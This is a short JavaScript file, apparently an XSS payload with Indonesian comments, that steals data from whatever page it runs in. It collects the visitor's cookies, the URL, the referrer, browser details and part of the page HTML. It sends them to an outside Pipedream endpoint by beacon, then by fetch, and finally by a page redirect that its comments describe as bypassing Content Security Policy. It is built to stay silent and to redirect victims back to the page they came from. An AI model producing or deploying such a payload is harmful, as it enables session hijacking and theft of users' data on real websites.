(function () {
  // Config: Pastikan Pipedream sudah diset RETURN 302 (Redirect Back)
  const ENDPOINT = "https://eozpb8qg2g763of.m.pipedream.net"; 

  try {
    const data = {
      url: location.href,
      cookie: document.cookie, 
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      // Kita kurangi size HTML biar URL tidak terlalu panjang & error
      html: document.documentElement.outerHTML.slice(0, 500), 
      ts: new Date().toISOString()
    };

    // Encode payload ke Base64 agar aman di URL & tidak merusak struktur query
    const encodedPayload = btoa(JSON.stringify(data));
    // Tambahkan random string untuk mematikan cache browser
    const exfilUrl = `${ENDPOINT}/?data=${encodedPayload}&_=${Math.random()}`;

    // --- METODE PENGIRIMAN ---

    // 1. Silent Attempt (Beacon)
    const blob = new Blob([JSON.stringify(data)], {type : 'application/json'});
    const sent = navigator.sendBeacon(ENDPOINT, blob);

    // 2. Jika Beacon gagal, coba Fetch dengan kredensial omit (Anti-CORS)
    if (!sent) {
        fetch(ENDPOINT, {
            method: "POST",
            mode: "no-cors",
            credentials: "omit", 
           // headers: { 
             //     "Content-Type": "text/plain" // Hindari trigger preflight CORS
            //},
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).catch(() => {
            // 3. NUCLEAR FALLBACK: Location Assign (CSP Bypass)
            // Masuk sini berarti 'connect-src' diblokir CSP.
            // Kita paksa browser pindah halaman. Karena ini navigasi, 
            // CSP tidak bisa memblokirnya.
            
            // NOTE: Agar "Silent", pastikan Pipedream me-redirect user 
            // kembali ke halaman asal (Referrer) atau Login Page.
            window.location.assign(exfilUrl);
        });
    }

  } catch (e) {
    // Fail silently
  }
})();
